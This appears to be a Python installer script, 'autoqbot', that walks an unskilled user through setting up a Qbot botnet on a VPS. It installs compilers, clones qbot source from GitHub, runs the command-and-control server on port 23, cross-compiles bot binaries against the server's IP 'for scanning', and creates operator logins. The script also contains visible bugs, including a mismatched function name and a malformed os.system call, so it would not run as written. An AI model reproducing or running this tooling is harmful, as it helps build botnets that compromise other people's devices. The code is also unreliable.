# autoqbot for everyone who doesn't understand linux
# copyright 2017-18 TrackProjects at Sat Oct 21 2017
# version 0.2.1 & build 0.1.3
#! /usr/bin/python

import os
import time
import sys

class bcolors:
    HEADER = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def __rename__():
  print('Renaming cc7.py.txt to cc7.py to prevent errors...' + bcolors.WARNING)
  os.system('cd qbot/')
  os.system('mv cc7.py.txt cc7.py')
  print('----> DONE!' + bcolors.OKGREEN)
  return

def __update__():
  print('Updating system first to prevent errors...' + bcolors.HEADER)
  os.system('sudo yum update') # optional but I recommend doing it to prevent errors
  print('----> DONE!' + bcolors.OKGREEN)
  return

def __install__():
  print('Installing dependencies...' + bcolors.BOLD)
  os.system('sudo yum install gcc screen python nano -y')
  print('----> DONE!' + bcolors.OKGREEN)
  return

def __start__():
  print('Welcome to autoqbot...' + bcolors.OKGREEN)
  print('Note: This is not a fully automated installer you will still have to configure some things by yourselfs!' + bcolors.WARNING)
  print('Starting the auto install...' + bcolors.WARNING)
  return

def __downloadqbot__():
  print('Downloading qbot source from github...' + bcolors.WARNING)
  os.system('git clone https://github.com/1trackprojects1/qbot') # change the github link to yours
  print('----> DONE!' + bcolors.OKGREEN)
  return

def __gserver__():
  print('Making server application...')
  print('Note : Warnings are okay...' + bcolors.OKGREEN)
  time.sleep(3)
  os.system('gcc -o server server.c -pthread')
  return

def __screen___():
  print('Setting up screening for detach...')
  print('Please pree CTRL+A+D on your keyboard after this screen goes, if you recived [detached] then your are set to go!')
  time.sleep(5)
  os.system('screen ./server 23 1000 777') # change the 777 and put the port you want to use to connect to your botnet
  return

def __finalsetup__():
  print('Downloading cross-compilers, please press Y for getting arks, final step!' + bcolors.OKGREEN)
  serverip = raw_input('Please enter your VPS ip : ')
  os.system('python cc7.py client.c ', serverip)
  print('PLEASE COPY THE LINK GIVEN IN GREEN AND KEEP IT SAFE YOU WILL NEED IT FOR SCANNING' + bcolors.WARNING)
  return

def __logins__():
  print('Create logins for the net...')
  print('Script will make a login file now in TE nano, please enter logins like this(no brackets)EX: blue(username) examplepassword(password)')
  print('Once you are done please press CTRL + X and then press y and enter, and then you are done you net has been made!')
  time.sleep(5)
  os.system('nano login.txt')
  return

# ---------------------------------------------------

__start__()
__update__()
__install__()
__downloadqbot__()
__rename__()
__gserver__()
__screen__()
__finalsetup__()
__logins__()


